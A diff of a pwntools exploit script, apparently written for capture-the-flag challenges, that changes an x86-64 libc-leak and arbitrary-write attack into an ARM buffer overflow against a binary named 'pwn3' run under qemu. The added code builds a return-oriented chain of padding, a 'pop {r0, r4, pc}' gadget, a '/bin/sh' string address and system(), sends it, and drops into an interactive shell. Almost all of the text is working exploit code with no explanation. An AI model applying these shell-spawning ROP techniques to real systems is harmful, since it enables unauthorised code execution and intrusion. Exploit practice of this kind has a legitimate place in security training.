@@ -4,16 +4,16 @@
 
 from pwn import *
 
-local_file  = './write'
+local_file  = './pwn3'
 local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
-remote_libc = '../libc.so.6'
+remote_libc = local_libc # '../libc.so.6'
 
 is_local = False
 is_remote = False
 
 if len(sys.argv) == 1:
     is_local = True
-    p = process(local_file)
+    p = process(['qemu-arm','-g','1234','-L','/usr/arm-linux-gnueabi/','./pwn3'])
     libc = ELF(local_libc)
 elif len(sys.argv) > 1:
     is_remote = True
@@ -29,6 +29,7 @@ elf = ELF(local_file)
 
 context.log_level = 'debug'
 context.arch = elf.arch
+context.terminal = ['/usr/bin/qemu-arm']
 
 se      = lambda data               :p.send(data) 
 sa      = lambda delim,data         :p.sendafter(delim, data)
@@ -46,37 +47,24 @@ def debug(cmd=''):
 
 # info
 # gadget
-prdi = 0x00000000000009e3 # pop rdi ; ret
+pop_r0_r4_pc = 0x0001fb5c # pop {r0, r4, pc}
 
 # elf, libc
+binsh  = 0x00049018
+system = 0x00014b5c+1
 
-ru('puts: ')
-puts = eval(rc(14))
-ru('stack: ')
-stack = eval(rc(14))
+# rop1
+offset = cyclic_find('kaab') 
+payload = 'A'*offset
+payload += p32(pop_r0_r4_pc)+p32(binsh)+p32(0)+p32(system)
 
-libcbase = puts - libc.sym['puts']
-info_addr('libcbase',libcbase)
-
-ptr = libcbase+0x619f60 #0x239f68
-info_addr('ptr',ptr)
-system = libcbase+libc.sym['system']
-info_addr('system',system)
-rdi = libcbase+0x619968 #0x239968
-info_addr('rdi',rdi)
-
-sl('w')
-sl(str(ptr))
-sl(str(system))
-
-sl('w')
-sl(str(rdi))
-sl(str(u64('/bin/sh\0')))
-
-debug('b *$rebase(0x969)')
-sl('q')
+ru('buffer: ')
+# debug()
+pause()
+sl(payload)
 
 # info_addr('tag',addr)
 # log.warning('--------------')
 
 p.interactive()
+
